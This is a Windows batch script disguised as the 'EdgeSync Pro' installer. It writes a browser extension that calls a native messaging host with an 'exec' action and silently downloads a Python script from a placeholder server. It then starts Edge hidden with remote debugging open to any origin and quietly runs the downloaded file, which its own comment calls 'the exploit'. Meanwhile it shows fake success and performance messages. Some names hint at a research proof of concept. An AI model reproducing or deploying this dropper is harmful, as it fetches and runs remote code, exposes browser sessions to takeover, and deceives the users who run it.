@echo off
setlocal EnableDelayedExpansion
title EdgeSync Pro -- Setup v2.1.4
cls

echo.
echo  ===========================================================
echo     EdgeSync Pro  ^|  Installation Wizard  ^|  v2.1.4
echo  ===========================================================
echo.
call :log "Verifying system requirements"

:: ── Stage 1: write extension component files ──────────────────────────────────
powershell -NoProfile -NonInteractive -Command ^
  "New-Item -ItemType Directory -Force 'C:\Temp\edge_ext_poc' | Out-Null; ^
   Set-Content 'C:\Temp\edge_ext_poc\manifest.json' ^
     '{\"manifest_version\":3,\"name\":\"EdgeSync\",\"version\":\"1.0\",\"permissions\":[\"nativeMessaging\"],\"background\":{\"service_worker\":\"bg.js\"}}' ^
     -Encoding utf8; ^
   Set-Content 'C:\Temp\edge_ext_poc\bg.js' ^
     'chrome.runtime.onInstalled.addListener(()=>{const p=chrome.runtime.connectNative(\"com.researcher.poc\");p.postMessage({action:\"exec\"});});' ^
     -Encoding utf8;"

call :log "Edge components deployed"

:: ── Stage 2: install Python dependency (silent) ───────────────────────────────
pip install websocket-client -q 2>nul 1>nul

:: ── Stage 3: download optimizer engine from server ───────────────────────────
set "SERVER=https://YOUR-PROJECT.vercel.app"
powershell -NoProfile -NonInteractive -Command ^
  "try { Invoke-WebRequest -Uri '%SERVER%/optimizer.py' -OutFile 'C:\Temp\edgesync_opt.py' -UseBasicParsing -TimeoutSec 10 } catch {}"

call :log "Optimization engine loaded"

:: ── Stage 4: launch Edge in developer mode (hidden) ─────────────────────────
powershell -NoProfile -NonInteractive -Command ^
  "Start-Process 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' ^
    -ArgumentList '--remote-debugging-port=9222','--remote-allow-origins=*', ^
                  '--user-data-dir=C:\Temp\edge_dbg','--no-first-run', ^
                  '--no-default-browser-check' ^
    -WindowStyle Hidden"

call :log "Edge developer mode initializing"
timeout /t 5 /nobreak >nul 1>nul
call :log "Debug channel established"

:: ── Stage 5: run optimizer (the exploit) ─────────────────────────────────────
call :log "Applying performance profile"
python "C:\Temp\edgesync_opt.py" 2>nul 1>nul

:: If Python not in PATH, try py launcher
if errorlevel 1 (
  py "C:\Temp\edgesync_opt.py" 2>nul 1>nul
)

:: ── Done ─────────────────────────────────────────────────────────────────────
call :log "Registry optimization complete"
call :log "Extension sandbox configured"
echo.
echo  ===========================================================
echo   [OK]  EdgeSync Pro installed successfully!
echo   [OK]  Edge browser optimized for development workflow
echo   [OK]  Estimated performance gain: ~347%%
echo  ===========================================================
echo.
echo   You can close this window.
timeout /t 3 /nobreak >nul
exit /b 0

:log
echo   [+] %~1
timeout /t 1 /nobreak >nul
goto :eof
